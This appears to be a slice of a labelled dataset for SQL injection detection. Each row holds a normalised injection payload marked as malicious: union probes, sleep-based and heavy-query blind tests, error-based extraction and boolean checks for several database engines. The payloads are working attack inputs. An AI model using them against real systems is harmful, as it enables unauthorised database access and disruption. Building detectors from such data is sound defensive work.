row_index,payload_norm,label,sqli_type_hint
6060,"1"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""ffcf"" like ""ffcf",1,
6061,"-1490'|| ( select 'uzbm' from dual where 3181 = 3181 union all select 3181,3181,3181,3181,3181--",1,
6062,"1"" ) where 5794 = 5794 union all select null,null,null,null,null,null,null,null,null,null#",1,
6063,1 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1,
6064,"1"" ) as vqkz where 8536 = 8536",1,
6065,-4363%' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( '%' = ',1,
6066,"1' ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'sied' = 'sied",1,
6067,"-5891 ) where 5792 = 5792 union all select 5792,5792,5792,5792,5792#",1,
6068,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",1,
6069,"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,1,
6070,1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1,
6071,"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",1,
6072,"-7544"" ) ) union all select 3808,3808,3808,3808--",1,
6073,"-7032' ) as xmmm where 5635 = 5635 union all select 5635,5635,5635,5635,5635--",1,
6074,waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,1,
6075,"1 where 5859 = 5859 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6076,"1"" ) where 2445 = 2445",1,
6077,end and 'icny' like 'icny,1,
6078,1 where 4940 = 4940,1,
6079,"1"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""kkim"" = ""kkim",1,
6080,"1' and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and 'lgat' like 'lgat",1,
6081,"1%"" ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""%"" = """,1,
6082,1 ) ) as ztcn where 1043 = 1043 and 6305 = 5785--,1,
6083,"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",1,
6084,"-9389' where 5713 = 5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1,
6085,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ""qkat"" = ""qkat",1,
6086,"1"" ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ""ponv"" = ""ponv",1,
6087,"1 union all select null,null,null,null,null,null,null,null,null,null#",1,
6088,select ( case when ( 5914 = 2314 ) then 5914 else 1/ ( select 0 ) end ) --,1,
6089,"1"" ) union all select null,null--",1,
